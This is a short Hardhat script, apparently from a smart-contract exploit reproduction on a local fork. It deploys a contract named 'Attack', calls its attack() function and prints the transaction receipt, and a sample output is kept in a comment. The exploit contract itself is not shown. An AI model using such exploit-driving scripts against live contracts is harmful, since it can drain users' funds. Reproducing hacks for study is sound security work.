const hre = require("hardhat");

async function main() {

  // 布署合约
  let Attack = await hre.ethers.getContractFactory("Attack");

  const attack = await Attack.deploy();
  await attack.deployed();

  console.log("Attack deployed to:", attack.address);

  let tx = await attack.attack();
  let receipt = await tx.wait();
  delete receipt.logs; 
  delete receipt.events;
  delete receipt.logsBloom;
  console.log(receipt);
  // {
  //   to: '0x04C89607413713Ec9775E14b954286519d836FEf',
  //   from: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',
  //   contractAddress: null,
  //   transactionIndex: 0,
  //   gasUsed: BigNumber { _hex: '0x65200c', _isBigNumber: true },
  //   blockHash: '0xb42bea5a3a0abef1780c5ffe4b05df47efabb52b42d4bb2af0612935f077a6d5',
  //   transactionHash: '0xe574865ad2f155613501be3c68a51e4868ad25019c613e233baef9aa31138da1',
  //   blockNumber: 13417950,
  //   confirmations: 1,
  //   cumulativeGasUsed: BigNumber { _hex: '0x65200c', _isBigNumber: true },
  //   effectiveGasPrice: BigNumber { _hex: '0x1a911d9121', _isBigNumber: true },
  //   status: 1,
  //   type: 2,
  //   byzantium: true
  // }

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
